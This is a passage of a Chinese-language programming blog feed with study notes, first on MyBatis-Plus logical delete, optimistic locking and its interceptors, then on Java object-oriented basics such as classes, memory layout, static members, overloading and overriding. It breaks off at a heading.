<ul>
<li>物理删除：真实删除，将对应数据从数据库中删除，之后查询不到此条被删除的数据</li>
<li>逻辑删除：假删除，将对应数据中代表是否被删除字段的状态修改为“被删除状态”，之后在数据库中仍旧能看到此条数据记录</li>
</ul>
<h3 id="实现方式："><a href="#实现方式：" class="headerlink" title="实现方式："></a><strong>实现方式：</strong></h3><p><strong>步骤</strong>：</p>
<ol>
<li><p>表中<code>添加逻辑删除字段</code>，可以是布尔、整数、枚举类型。若为整数类型，默认 1 为逻辑删除  0 为未删除。</p>
</li>
<li><p>实体类添加逻辑删除属性。</p>
</li>
<li><p>指定逻辑删除字段和属性值。两种方式</p>
<ul>
<li>单一指定：在实体类中使用<code>@TableLoginc</code>注解标明字段。</li>
<li>全局指定：在配置文件中使用<code>logic-delete-field:</code>配置项</li>
</ul>
</li>
<li><p>此后按原方法执行正常CRUD操作，Mybatis-Plus会自动判断逻辑删除还是修改，将使用删除语句改为修改逻辑字段的语句。</p>
</li>
</ol>
<p><strong>全局指定示例：</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-field:</span> <span class="string">deleted</span> <span class="comment"># 代表逻辑删除状态的属性名</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="number">1</span> <span class="comment"># 已逻辑删除时的值</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span> <span class="comment"># 未删除时的值，默认值</span></span><br></pre></td></tr></table></figure>

<p><strong>单一指定示例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_emp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(value = &quot;emp_id&quot;,type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 表明此属性对应的列是逻辑删除的状态字段</span></span><br><span class="line"><span class="comment">     * 当删除数据时自动变成修改此字段值，默认0为未删除；1为删除</span></span><br><span class="line"><span class="comment">     * 当查询数据时，默认只查询 deleted = 0 的数据</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="meta">@TableLogic</span></span><br><span class="line">    <span class="keyword">private</span> Integer deleted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><p>在并发编程和数据库管理中，锁机制用于确保数据的一致性和完整性。乐观锁（Optimistic Locking）和悲观锁（Pessimistic Locking）是两种常见的并发控制策略。它们各自有不同的适用场景和优缺点。</p>
<p>悲观锁适用场景</p>
<ul>
<li><strong>高冲突场景</strong>：例如，多个事务频繁修改同一组数据。</li>
<li><strong>短事务</strong>：事务执行时间较短，锁定资源的时间也较短。</li>
</ul>
<p>乐观锁适用场景</p>
<ul>
<li><p><strong>低冲突场景</strong>：例如，大多数情况下只有一个事务在修改数据。</p>
</li>
<li><p><strong>长事务</strong>：事务执行时间较长，锁定资源会影响其他事务的执行。</p>
</li>
</ul>
<h4 id="悲观锁（Pessimistic-Locking）"><a href="#悲观锁（Pessimistic-Locking）" class="headerlink" title="悲观锁（Pessimistic Locking）"></a><strong>悲观锁（Pessimistic Locking）</strong></h4><ul>
<li><strong>悲观锁</strong> 假设冲突会发生，并且在进行任何操作之前先锁定资源。这意味着在读取或写入数据时，其他事务将被阻塞，直到当前事务完成并释放锁。</li>
<li>悲观锁通常通过数据库管理系统（DBMS）的锁机制来实现，如行级锁、表级锁等。</li>
</ul>
<p><strong>工作原理</strong></p>
<ol>
<li><strong>获取锁</strong>：当一个事务需要访问某个资源时，首先尝试获取该资源的锁。</li>
<li><strong>执行操作</strong>：在持有锁期间，事务可以安全地读取或修改数据。</li>
<li><strong>释放锁</strong>：操作完成后，事务释放锁，允许其他事务访问该资源。</li>
</ol>
<h4 id="乐观锁（Optimistic-Locking）"><a href="#乐观锁（Optimistic-Locking）" class="headerlink" title="乐观锁（Optimistic Locking）"></a>乐观锁（Optimistic Locking）</h4><ul>
<li><strong>乐观锁</strong> 假设冲突很少发生，在进行操作时不会锁定资源。它依赖于版本号或时间戳来检测冲突。只有在提交时才会检查是否有冲突发生，如果有冲突，则回滚事务。</li>
<li>乐观锁通常通过应用程序逻辑来实现，而不是依赖数据库的锁机制。通过<strong>版本号或时间戳</strong>来检测冲突，提高了并发性能，但在冲突频繁时可能导致大量重试。</li>
</ul>
<p><strong>工作原理</strong></p>
<ol>
<li><strong>读取数据</strong>：事务读取数据时，同时获取当前版本号或时间戳。</li>
<li><strong>执行操作</strong>：事务对数据进行修改。</li>
<li><strong>提交事务</strong>：在提交时，检查版本号或时间戳是否与读取时一致。如果一致，则更新成功；如果不一致，则说明有其他事务已经修改了数据，当前事务需要回滚或重试。</li>
</ol>
<h3 id="Mybatis-Plus实现乐观锁"><a href="#Mybatis-Plus实现乐观锁" class="headerlink" title="Mybatis-Plus实现乐观锁"></a>Mybatis-Plus实现乐观锁</h3><p>步骤：</p>
<p>1、添加Mybatis版本号更新拦截器（插件）（类似上文分页插件的添加方式，在主程序类中添加）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// mybatis-plus的插件集合</span></span><br><span class="line">    <span class="comment">// 【加入到此集合即可，mybatis-plus的如何插件，包括分页插件、乐观锁插件等都需要时应该加入】</span></span><br><span class="line">    <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">    <span class="comment">// 乐观锁【版本号插件】 MP会在每次更新时自动对比版本号并自增版本号</span></span><br><span class="line">    mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">OptimisticLockerInnerInterceptor</span>());</span><br><span class="line">    <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2、数据库添加<code>version</code>字段，实体类添加乐观锁属性并使用<code>@Version注解</code>标明</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_emp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(value = &quot;emp_id&quot;,type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">    <span class="meta">@TableLogic</span></span><br><span class="line">    <span class="keyword">private</span> Integer deleted;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、正常更新使用即可。</p>
<h2 id="防全表更新和删除"><a href="#防全表更新和删除" class="headerlink" title="防全表更新和删除"></a>防全表更新和删除</h2><p>只需要添加一个防止全表更新和删除的拦截器（插件）即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// mybatis-plus的插件集合</span></span><br><span class="line">    <span class="comment">// 【加入到此集合即可，mybatis-plus的如何插件，包括分页插件、乐观锁插件等都需要时应该加入】</span></span><br><span class="line">    <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">    <span class="comment">// mybatisPlusInterceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor());</span></span><br><span class="line">    mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">BlockAttackInnerInterceptor</span>());</span><br><span class="line">    <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="MybatisX插件-逆天的代码自动生成工具"><a href="#MybatisX插件-逆天的代码自动生成工具" class="headerlink" title="MybatisX插件(逆天的代码自动生成工具)"></a>MybatisX插件(逆天的代码自动生成工具)</h1><p><strong>功能：</strong></p>
<ul>
<li><p>可以自动生成实体类、mapper接口、mapperXML文件、Service层接口及实现类等。</p>
</li>
<li><p>在mapper接口中声明方法，即可自动在xml中生成SQL语句</p>
<blockquote>
<p>在mapper中输入select&#x2F;insert等关键词时会自动联想，根据需要选择。选择结束后点击，alter+enter自动生成。</p>
</blockquote>
</li>
</ul>
<p>这是一个IDEA插件，安装即可</p>
<p><strong>使用方法</strong>：</p>
<ol>
<li>IDEA数据库连接</li>
<li>在IDEA数据库右键需要生成代码的表，选择，按如下填写</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250205005402.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250205005728.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="常见问题-错误"><a href="#常见问题-错误" class="headerlink" title="常见问题&#x2F;错误"></a>常见问题&#x2F;错误</h2><h2 id="重要知识点"><a href="#重要知识点" class="headerlink" title="重要知识点"></a>重要知识点</h2><h2 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h2>]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>MyBatisPlus</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Note2-面向对象</title>
    <url>/2024/06/24/Java-Note2-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>Java面向对象编程</p>
<span id="more"></span>

<p><a href="https://www.bilibili.com/video/BV1PY411e7J6/?p=15&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-java基础教程</a><br><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程-java</a><br><a href="https://www.runoob.com/manual/jdk11api/index.html">Java API 参考文档</a><br>参考书籍:《java核心技术》《Effective Java》 《java编程思想》</p>
<h2 id="面向对象编程678"><a href="#面向对象编程678" class="headerlink" title="面向对象编程678"></a>面向对象编程678</h2><ul>
<li>Java类及类的成员：属性、方法、构造器；代码块，内部类</li>
<li>面向对象的特征：封装，进程，多态，(抽象)</li>
<li>其他关键字的应用。</li>
<li>类：具有相同特征的事物的抽象描述，是‘抽象的’，概念上的定义</li>
<li>对象：实际存在的某类事物的每个个体，是具体的，也称为实例</li>
<li>面向对象以类为基础，面向过程以函数为基础</li>
</ul>
<h3 id="类的实例化和对象"><a href="#类的实例化和对象" class="headerlink" title="类的实例化和对象"></a>类的实例化和对象</h3><p>属性：该类事物的状态信息，类中的成员变量<br>方法：该类事物的操作或基于其状态的行为，类中的成员方法<br>三步：</p>
<ol>
<li>创建类并设计其内部成员（属性，方法）</li>
<li>创建类的对象比如&#96;Phone p1 &#x3D; new Phone();</li>
<li>通过对象调用其内部声明的属性和方法完成对应功能。</li>
<li>引用数据类型除String外调用必须使用new</li>
</ol>
<p>类的声明：独立的以类名为文件名的文件内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">char</span> gender;</span><br><span class="line">    MyDate birthday;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleeping&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类的实例化：在另一个文件中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="comment">//通过对象调用属性或方法</span></span><br><span class="line">        p1.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.gender = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">        p1.MyDate=<span class="keyword">new</span> </span><br><span class="line">        <span class="title class_">System</span>.out.println(<span class="string">&quot;name=&quot;</span> + p1.name + <span class="string">&quot;,age=&quot;</span> + p1.age);</span><br><span class="line">        p1.sleep();</span><br><span class="line">        p1.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类和对象的内存结构"><a href="#类和对象的内存结构" class="headerlink" title="类和对象的内存结构"></a>类和对象的内存结构</h4><p>栈：方法内定义的变量，储存在栈中<br>堆：new 出的结构，如数组实体，对象实体，包括对象中的属性<br>方法区：存放类的模板，比如Person类的模板</p>
<p>以上述声明的Person类及其实例化过程为例，当调用main方法时，向栈中压入main方法的栈帧，压入其声明的变量p1，然后在堆中分配(new)一段Person类实体的空间，其中包括name,age,gender，将其起始地址赋给栈中p1。p1.name即根据p1找到起始地址，再利用起始地址找到name修改其值。若有p3&#x3D;p1，则将p1指向地址值直接赋给p3，不用new就不会在堆中新分配空间<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240628004309.png" alt="类对象内存结构示意图"></p>
<p>总结：<br>创建(new)类的多个对象时，每个对象在堆中都有一个对象实体，每个实体中保存着一份类的属性，修改某个对象的某属性值不会影响其他属性<br>声明(Person p1)多个类的变量，并将其互相赋值（p3&#x3D;p1）如果通过其中一个对象修改属性值会导致另一个也发生变化。</p>
<h4 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h4><p>满足以下标准的类：</p>
<ol>
<li>类是公共的</li>
<li>有一个无参的公共的构造器</li>
<li>有属性且有其对应的get set方法</li>
</ol>
<p>用户可以使用JavaBean将功能、处理、值、数据库访问和其他任何可以用Java代码创造的对象进行<br>打包，并且其他的开发者可以通过内部的JSP页面、Servlet、其他JavaBean、applet程序或者应用来<br>使用这些对象。用户可以认为JavaBean提供了一种随时随地的复制和粘贴的功能，而不用关心任何<br>改变</p>
<h4 id="UML类图"><a href="#UML类图" class="headerlink" title="UML类图"></a>UML类图</h4><p>UML（Unified Modeling Language，统一建模语言），用来描述 软件模型 和 架构 的图形化语言。<br>常用的UML工具软件有 PowerDesinger 、 Rose 和 Enterprise Architect 。<br>UML工具软件不仅可以绘制软件开发中所需的各种图表，还可以生成对应的源代码。<br>在软件开发中，使用 UML类图 可以更加直观地描述类内部结构（类的属性和操作）以及类之间的关系（如关联、依赖、聚合等）。<br>+表示public类型， -表示private类型，#表示protected类型<br>方法的写法: 方法的类型(+、-) 方法名(参数名： 参数类型)：返回值类型<br>斜体表示抽象方法或类。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240701165845.png" alt="UML类图示例"></p>
<h3 id="属性-字段"><a href="#属性-字段" class="headerlink" title="属性(字段)"></a>属性(字段)</h3><h4 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h4><p>成员变量和局部变量</p>
<ul>
<li>相同点<ul>
<li>声明的格式相同：数据类型 变量名 &#x3D; 变量值</li>
<li>变量都有其有效的作用域，作用域外不能使用</li>
<li>必须先声明再赋值，最后使用</li>
</ul>
</li>
<li>不同点<ul>
<li>成员变量声明在类内方法外，局部变量声明在方法，构造器内</li>
<li>成员变量随着对象的创建储存在堆空间，局部变量储存在栈空间</li>
<li>成员变量随着对象的创建和消亡而创建和消亡；局部变量随方法对应的栈帧入栈，随其栈帧出栈而消亡</li>
<li>成员变量在整个类中有效，局部变量仅限于声明其的方法或构造器或代码块中使用</li>
<li>成员变量可以使用public,protected等权限修饰符，局部变量不能！</li>
<li>成员变量都有默认初始化值，局部变量均没有初始化值，对于方法的形参，在调用时赋值即可</li>
</ul>
</li>
</ul>
<h4 id="类作为属性"><a href="#类作为属性" class="headerlink" title="类作为属性"></a>类作为属性</h4><p><strong>类中引用另一个类作为其属性</strong>时，必须使用new，如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDate</span> &#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="type">int</span> month;</span><br><span class="line">    <span class="type">int</span> day;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="comment">/**编号id、姓名name、年龄age、薪资salary。*/</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">double</span> salary;</span><br><span class="line">    MyDate birthday;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmployeeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">employ1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">        employ1.id = <span class="number">1</span>;</span><br><span class="line">        employ1.birthday = <span class="keyword">new</span> <span class="title class_">MyDate</span>();</span><br><span class="line">        employ1.birthday.day = <span class="number">20</span>;</span><br><span class="line">        employ1.birthday.month = <span class="number">3</span>;</span><br><span class="line">        employ1.birthday.year = <span class="number">2001</span>;</span><br><span class="line">        employ1.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        employ1.salary = <span class="number">10000.0</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名=&quot;</span> + employ1.name + <span class="string">&quot;,员工id&quot;</span> + employ1.id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="实例变量的赋值过程"><a href="#实例变量的赋值过程" class="headerlink" title="实例变量的赋值过程"></a>实例变量的赋值过程</h4><p>实例变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="comment">//实例变量(对象各自拥有)</span></span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="comment">//静态变量(类变量，多个对象共用)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> idCard;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>实例变量的赋值过程(字节码文件可见)：</p>
<ol>
<li>默认赋值(初始化)</li>
<li>(原类内)显示赋值(初始化)</li>
<li>构造器中赋值(初始化)</li>
<li>通过<code>对象.方法</code>赋值</li>
<li>通过<code>对象.属性</code>赋值</li>
</ol>
<h4 id="实例变量和静态变量的区别"><a href="#实例变量和静态变量的区别" class="headerlink" title="实例变量和静态变量的区别"></a>实例变量和静态变量的区别</h4><p>实例变量和静态变量的区别：</p>
<ol>
<li>实际个数<ul>
<li>静态变量：在内存空间只有一份，所有同类对象共享</li>
<li>实例变量：类的每一个实例（对象）都保持一份自己的实例变量</li>
</ul>
</li>
<li>内存位置<ul>
<li>静态变量：&lt;&#x3D;jdk6时，存在方法区；&gt;&#x3D;jdk7时存在堆空间</li>
<li>实例变量：存放在堆空间的对象实体中</li>
</ul>
</li>
<li>加载时机：<ul>
<li>静态变量：随着类的加载而加载，由于类只会加载一次，所以静态变量也只有一份</li>
<li>实例变量：随着对象的创建而加载，每个对象拥有一份</li>
</ul>
</li>
<li>调用者<ul>
<li>静态变量：可以被类直接调用或使用对象调用</li>
<li>实例变量：只能使用对象调用</li>
</ul>
</li>
<li>消亡时机：<ul>
<li>静态变量：随类的卸载而消亡</li>
<li>实例变量：随对象的消亡而消亡</li>
</ul>
</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h4 id="方法的声明"><a href="#方法的声明" class="headerlink" title="方法的声明"></a>方法的声明</h4><p>方法是类或对象行为特征的抽象，用来完成某个功能操作。在某些语言中也称为 函数 或 过程 。<br>语法格式：[修饰符] 返回值类型 方法名([形参列表])[throws 异常列表]{方法体}</p>
<p>修饰符：可选的。方法的修饰符也有很多，例如：public、protected、private、static、abstract、native、final、synchronized等，</p>
<p>注意：</p>
<ol>
<li>Java里的方法 不能独立存在 ，所有的方法必须定义在类里</li>
<li>必须先声明后使用，且方法必须定义在类的内部</li>
<li>调用一次就执行一次，不调用不执行。</li>
<li>方法中可以调用类中的方法或属性，不可以在方法内部定义方法。</li>
</ol>
<p>return关键字：</p>
<ol>
<li>返回值</li>
<li>结束方法</li>
</ol>
<h4 id="方法调用内存解析"><a href="#方法调用内存解析" class="headerlink" title="方法调用内存解析"></a>方法调用内存解析</h4><p>方法<em>没有被调用</em>的时候，都在<em>方法区</em>中的字节码文件(.class)中存储。<br>方法<em>被调用</em>的时候，需要进入到<em>栈内存</em>中运行。方法每调用一次就会在栈中有一个<em>入栈</em>动作，即给当前方法开辟一块独立的内存区域，用于存储当前方法的局部变量的值。当方法执行结束后，会释放该内存，称为<em>出栈</em>，如果方法有返回值，就会把结果返回调用处，如果没有返回值，就直接结束，回到调用处继续执行下一条指令。<em>一旦方法执行完，立即出栈，清除其栈帧</em></p>
<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p1.eat();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        sleep();</span><br><span class="line">        System.out.println(<span class="string">&quot;人：吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人：睡觉&quot;</span>);</span><br><span class="line">        doSport();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doSport</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人：运动&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240629115308.png" alt="方法调用内存解析"></p>
<h4 id="方法的应用"><a href="#方法的应用" class="headerlink" title="方法的应用"></a>方法的应用</h4><p>类内方法输出类内属性，可以直接使用属性名，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="comment">/**编号id、姓名name、年龄age、薪资salary。*/</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">outputMessage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名=&quot;</span> + name + <span class="string">&quot;,员工id&quot;</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="静态方法-类方法"><a href="#静态方法-类方法" class="headerlink" title="静态方法(类方法)"></a>静态方法(类方法)</h4><p>随着类的加载而加载<br>可以通过“类.静态方法”的方式，直接调用，对象也可调用类方法<br>静态方法内可以调用静态属性或方法，不能调用其他非静态结构（属性和方法(非静态属性和方法类中调用时实际包含了this.前缀，this在静态下无法指定对象)）。<br>静态方法中不能使用this和super<br>类中非静态方法可以调用静态方法</p>
<h4 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h4><p>同一个类中允许存在多个同名的方法，只要它们的*<em>参数列表(类型、顺序、数量)不同</em>即可，满足这些特征的方法，彼此之间构成重载。但方法的重载<em>与方法的形参名，权限修饰符，返回值类型无关</em>，取不同名字的形参不可构成重载，会报错<br>编译器通过方法名和形参列表共同确定方法。</p>
<p>示例:println函数的重载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       <span class="type">int</span>[] array = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>&#125;;</span><br><span class="line">       <span class="type">char</span>[] array1 = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;;</span><br><span class="line">       <span class="type">boolean</span>[] array2 = <span class="keyword">new</span> <span class="title class_">boolean</span>[]&#123;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>&#125;;</span><br><span class="line">       System.out.println(array1);<span class="comment">//打印abc</span></span><br><span class="line">       System.out.println(array);<span class="comment">//打印地址</span></span><br><span class="line">       System.out.println(array2);<span class="comment">//打印地址</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240629162722.png" alt="println函数的重载"></p>
<h4 id="方法的重写-继承的应用"><a href="#方法的重写-继承的应用" class="headerlink" title="方法的重写(继承的应用)"></a>方法的重写(继承的应用)</h4><p>子类在继承父类以后，针对父类中不适合子类的方法进行覆盖重写<br>重写方法：在子类中直接声明和父类中方法同形参同名的方法（根据编译器要求还应该在最前面加上@Override）</p>
<p>规则：</p>
<ol>
<li>子类重写的方法必须与父类被重写的方法有<em>相同的方法名和形参列表</em></li>
<li>子类重写的方法的<em>权限修饰符不小于</em>父类被重写的方法<br>但子类中不能重写父类中声明为private的方法</li>
<li><em>返回值</em>类型<ul>
<li>父类被重写方法的返回值类型是void或基本数据类型，则子类的返回值类型也必须是void或相同的基本数据类型</li>
<li>父类被重写方法的返回值类型是引用数据类型(如类)，则子类的返回值类型可以是相同的或是被重写方法的返回值类型的子类</li>
</ul>
</li>
<li><em>异常</em>处理：子类重写的方法抛出的异常类型可以与父类相同或是父类被重写方法抛出的异常的子类</li>
</ol>
<p><em>重载和重写</em>的关系<br>基本无关，回答各自概念</p>
<h4 id="可变个数形参的方法-jak-5-0"><a href="#可变个数形参的方法-jak-5-0" class="headerlink" title="可变个数形参的方法(jak&gt;&#x3D;5.0)"></a>可变个数形参的方法(jak&gt;&#x3D;5.0)</h4><p>注意：</p>
<ol>
<li>假如有可变个数形参，必须放在形成列表最后</li>
<li>可变个数形参方法的形参可以是0~n个</li>
<li>可与同类中同名固定个数的方法构成重载，优先选择固定个数方法</li>
<li>与同类型同数量的数组型的形参方法不构成重载，冲突</li>
<li>可变个数形参在一个方法的形参列表中最多出现一次</li>
</ol>
<p>示例：</p>
